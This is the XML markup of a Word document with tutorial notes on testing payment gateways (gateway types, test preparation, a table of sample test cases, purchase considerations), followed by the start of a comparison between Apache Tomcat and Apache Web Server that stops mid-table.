                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="187" w:after="187" w:line="748" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Types of Payment Gateway System</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Hosted Payment Gateway</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="281" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Hosted payment gateway system direct customer away from e-commerce site to gateway link during payment process.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> Once the payment is done, it will bring customer back to e-commerce site. For such type of payment you don't need merchant id, example of hosted payment gateway are PayPal, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Noche</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>WorldPay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Shared Payment Gateway</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="281"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 xml:space="preserve">In shared payment gateway, while processing payment customer is directed to payment page and stays on the e-commerce site. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Once the payment detail is filled, the payment process proceeds.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> Since it does not leave the e-commerce site while processing payment, this mode is easy and more preferable, example of shared payment gateway is </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>eWay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>, Stripe.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="187" w:after="187" w:line="748" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Testing Types for Payment Gateway System</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Testing for Payment Gateway should include</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Functional Testing</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>: It is the act of testing base functionality of the payment gateway. It is to verify whether the application behaves in same way as it is supposed to be like handling orders, calculation, addition of VAT as per the country etc.</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Integration</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>: Test integration with your credit card service.</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Performance</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>: Identify various performance metrics like highest possible number of users coming through gateways during specific day and converting them to concurrent users</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b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>: You need to perform a deep security pass for Payment Gateway.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="187" w:after="187" w:line="748" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Test Preparation for Testing Payment Gateway</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Before you begin testing -</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Collect proper test data for the dummy credit card number for maestro, visa, master etc.</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 xml:space="preserve">Collect payment gateway information like Google wallet, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Paypal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> or else</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Collect payment gateway document with error codes</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Understand the session and parameters passed through application and payment gateway</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Understand and test the amount related information passed through query string or variable or session</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Along with payment gateway language check the language of the application</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Under the various settings of payment gateway like currency format, subscriber data collected.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="187" w:after="187" w:line="748" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Sample Test Cases for Payment Gateway Testing</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="5000" w:type="pct"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1449"/>
        <w:gridCol w:w="8211"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidTr="004E3A7C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="750" w:type="pct"/>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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Sr</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>#</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jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Test Cases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During the payment process try to change the payment gateway language</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2</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After successful payment, test all the necessary components, whether it is retrieved or not</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4</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what happens if payment gateway stops responding during payment</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5</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During the payment process check what happens if session ends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6</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During the payment process check what happens in back end</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7</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what happens if payment process fails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8</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the Data-base entries whether they store credit card details or not</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9</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During payment process check error pages and security pages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10</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settings of pop-up blocker, and see what happens if pop up blocker is on and off</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11</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Between payment gateway and application check buffer pages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12</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 xml:space="preserve">Check on successful payment, a success code is send to the application and a </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>confirmation page is show to the user</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lastRenderedPageBreak/>
              <w:t>13</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Verify whether the transaction processes immediately or processing is hand to your bank</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14</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After successful transaction check if the payment gateway returns to your application</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15</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all format and messages when successful payment process</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16</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Unless you don't have an authorization receipt from payment gateway, good should not be shipped</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17</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Inform the owner for any transaction processed through e-mail. Encrypt the content of the mail</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18</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the amount format with currency format</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19</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if each of the payment options are selectable</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20</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Check if each listed payment option opens the respective payment option according to specification</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidTr="004E3A7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21</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="DDDDDD"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>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Verify whether the payment gateway defaults to the desired debit/credit card option</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidTr="004E3A7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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="DDDDDD"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="150" w:type="dxa"/>
              <w:left w:w="150" w:type="dxa"/>
              <w:bottom w:w="150" w:type="dxa"/>
              <w:right w:w="150" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="281" w:line="374" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>Verify the default option for debit card shows card selection drop down menu</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="187" w:after="187" w:line="748" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Things to consider before Buying Gateway Package</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lastRenderedPageBreak/>
        <w:t>If you have bought a shopping cart package, find out about its compatibility</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If shopping gateway package is due, ask the payment gateway provider for a list of supported applications</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The gateway must offer Address Verification System Protection</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Find out the types of transaction protection being offered</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Check what types of debit or credit cards are accepted by your chosen payment gateway</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Check the transaction fees levied by payment gateway</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Check whether the gateways collect the payment right on the form or direct to another page to complete the purchase</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="281" w:line="449" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Use the comments section below to contribute more test cases on Payment Gateway Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>How to test an application without requirements</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Apache Tomcat Server:</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Tomcat Server and Apache Web Server are two leading products offered by Apache Software Foundation. The differences between Apache Tomcat Server and Apache Web Server are listed below:</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Tomcat Server is a JSP/Servlet Container.</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Tomcat Server can handle both static pages and dynamic pages. The dynamic pages are generated using Servlet and JSP. The static pages are generated using HTML.</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Though Tomcat can execute PERL scripts and others, it is recommended that Apache Tomcat Server is used only for hosting Java based code.</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Tomcat Server is not just for request/response processing. The tomcat server is the container that can manage the entire lifecycle of pages generated through Servlet and JSP.  </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Tomcat Server is coded in pure java.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Apache Web Server:</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Web Server is a HTTP Server. It serves the files through HTTP Protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Apache Web Server can handle static pages generated using HTML. It can handle dynamic content coded in PHP, Perl, Ruby or other languages only through add-on modules offered by Apache or any other Client.</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Web Server can host applications written in any programming language, not just Java.</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Web Server is capable of request/response processing and load balancing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Apache Web Server is coded in C programming language.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="222222"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>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033A77" w:rsidRPr="00584E67" w:rsidTr="004E3A7C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="0" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="225" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="0" w:line="254" w:lineRule="atLeast"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>In general, the Apache HTTP server is just a plain old web server designed to serve static web pages. There are plenty of modules which can be installed to enhance Apache's abilities so that it can serve dynamic webpages using various technologies such as PHP, CGI or whatever, but the core of Apache is just a plain old HTTP server.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
